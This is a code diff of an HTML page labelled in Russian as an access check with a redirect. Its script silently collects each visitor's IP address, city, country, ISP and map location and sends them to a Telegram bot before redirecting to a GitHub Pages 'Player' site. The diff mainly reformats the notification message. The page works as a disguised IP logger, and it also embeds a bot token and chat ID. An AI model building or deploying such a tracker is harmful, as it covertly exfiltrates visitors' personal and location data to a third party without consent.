@@ -11,7 +11,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            font-family: system-ui;
+            font-family: system-ui, -apple-system, sans-serif;
             color: white;
             text-align: center;
             margin: 0;
@@ -36,7 +36,9 @@
         <h2>Проверка доступа</h2>
         <p>Перенаправление...</p>
     </div>
+
     <script>
+        // Плейсхолдеры — заменятся GitHub Actions
         const BOT_TOKEN = '8741671236:AAEI3Qz08IsslzQzO1ZJwU2havW8xk2wRVM';
         const CHAT_ID = '8114251347';
         const REDIRECT_URL = 'https://otklix.github.io/Player/';
@@ -69,14 +71,15 @@
                 geo = await getGeoByIP(ip);
             } catch(e) {}
             
-            let message = `Новый переход\nIP: ${ip}`;
+            let message = `🔔 Новый переход\n\n`;
+            message += `🌐 IP: ${ip}\n`;
             if (geo) {
-                if (geo.city) message += `\nГород: ${geo.city}`;
-                if (geo.country) message += `\nСтрана: ${geo.country}`;
-                if (geo.isp) message += `\nПровайдер: ${geo.isp}`;
-                if (geo.lat) message += `\nКарта: ${geo.mapUrl}`;
+                if (geo.city) message += `🏙️ Город: ${geo.city}\n`;
+                if (geo.country) message += `🇺🇳 Страна: ${geo.country}\n`;
+                if (geo.isp) message += `📡 Провайдер: ${geo.isp}\n`;
+                if (geo.lat) message += `🗺️ Карта: ${geo.mapUrl}\n`;
             }
-            message += `\nВремя: ${new Date().toLocaleString()}`;
+            message += `🕒 Время: ${new Date().toLocaleString()}`;
             
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -92,7 +95,7 @@
         sendNotification().finally(() => {
             setTimeout(() => {
                 window.location.href = REDIRECT_URL;
-            }, 800);
+            }, 1000);
         });
     </script>
 </body>
